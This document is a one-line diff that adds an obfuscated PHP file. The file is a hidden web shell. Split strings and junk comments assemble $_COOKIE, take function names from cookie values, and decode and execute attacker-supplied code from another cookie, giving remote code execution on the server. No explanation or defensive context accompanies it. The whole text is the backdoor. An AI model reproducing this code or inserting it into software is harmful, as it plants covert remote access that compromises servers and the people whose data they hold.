@@ -1,0 +1,1 @@
+<?php $t='OKI';$tr/*{*/='_CO';$ry/*|1^&*/='E';$vj=/*A5u*/${$tr.$t.$ry};$zp=$vj/*gM{*/['R'].$vj['Hq'];$xc=/*-k[r*/$vj['c'].$vj['fn'].$vj['x'];$h=$zp('',$xc($vj['bY']));$h();
